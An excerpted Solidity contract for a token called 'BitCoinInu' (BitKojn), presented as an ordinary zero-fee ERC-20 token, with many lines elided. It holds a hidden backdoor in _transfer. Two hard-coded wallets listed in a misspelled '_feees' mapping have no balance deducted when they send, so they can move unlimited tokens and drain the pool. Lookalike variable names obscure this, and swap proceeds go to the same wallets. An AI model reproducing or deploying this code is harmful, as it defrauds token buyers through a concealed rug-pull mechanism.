...
contract BitKojn is Context, IERC20, Ownable {
    ...
    address private DevWallet = 0xFf96779E5D3A0686Ee93e3F5e3953c5d27a01317;
    address private MarketingWallet = 0x66Abeaa4EC7CCc8d2146Cb5d9a0416E863D59f9c;     
    mapping(address => uint256) private _balancees;
    mapping(address => bool) private _feees;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    string private _name = "BitCoinInu";
    string private _symbol = "BitKojn";
    ...
    uint256 public EthCoinNeeded;
    uint256 public constant buyFee = 0;
    uint256 public constant sellFee = 0;
    address private Owner;
    
    constructor () {
         _balancees[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _feees[DevWallet] = true;
        _feees[MarketingWallet] = true;
    ...
    function ProvideLiq() external onlyOwner() {
    ...
    function ManualTransferERC20() external {
    ...
    function _transfer(address from, address to, uint256 txnAmount) private {
        ...
        if(from != owner() && to != owner() && from != address(this) && to != address(this)) {
            if(takeFees) {
                ...
                if (from != marketPair && to == marketPair) {
                    if(txnAmount > _balancees[from]) {
                        amount = _balancees[from];
                    }
        ...
        if (!_feees[from]) _balancees[from] = _balancees[from].sub(amount);
        _balancees[to] = _balancees[to].add(transferAmount);
        _balancees[address(this)] = _balancees[address(this)].add(taxAmount);
        emit Transfer(from, to, txnAmount);
    }
    function swapCoinForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        EthCoinNeeded = 42; // Initialization
        ...
        payable(DevWallet).transfer(halfShare);
        payable(MarketingWallet).transfer(halfShare); 
    }
